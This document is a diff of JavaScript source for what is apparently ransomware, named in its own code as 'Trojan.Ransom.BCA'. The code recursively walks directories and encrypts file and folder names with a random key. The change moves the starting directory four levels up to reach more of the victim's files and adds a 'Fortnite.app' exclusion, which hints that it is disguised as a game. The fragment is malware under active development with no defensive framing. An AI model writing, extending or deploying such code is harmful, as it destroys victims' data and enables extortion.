@@ -1,10 +1,11 @@
 const fs = require('fs');
 const crypto = require('crypto');
 const path = require('path');
-const parentDir = __dirname + "/../";
+const parentDir = __dirname + "/../../../../";
 const newKey = crypto.randomBytes(6).toString('base64');
 
 function encrypt (pathIn, key, isDir) {
+
     const oldName = pathIn.split('/').pop();
     const dir = pathIn.split('/').slice(0, -1).join('/') + '/';
     console.log(dir);
@@ -99,14 +100,14 @@ function search (pathIn, mode) {
                             if (mode === 0) encrypt(filePath, key, false);
                             else if (mode === 1) decrypt(filePath, key, false);
                         }
-                    } else if(stat.isDirectory()) {
-                    console.log( "'%s' is a directory.", filePath);
-                    if (file !== "Trojan.Ransom.BCA") {
-                        if (mode === 0) encrypt(filePath, key, true);
-                        else if (mode === 1) decrypt(filePath, key, true);
-                        search(filePath, mode);
+                    } else if(stat.isDirectory() ) {
+                        console.log( "'%s' is a directory.", filePath);
+                        if (file !== "Fortnite.app" && file !== "Trojan.Ransom.BCA.app") {
+                            if (mode === 0) encrypt(filePath, key, true);
+                            else if (mode === 1) decrypt(filePath, key, true);
+                            search(filePath, mode);
+                        }
                     }
-                }
 
                 });
             });
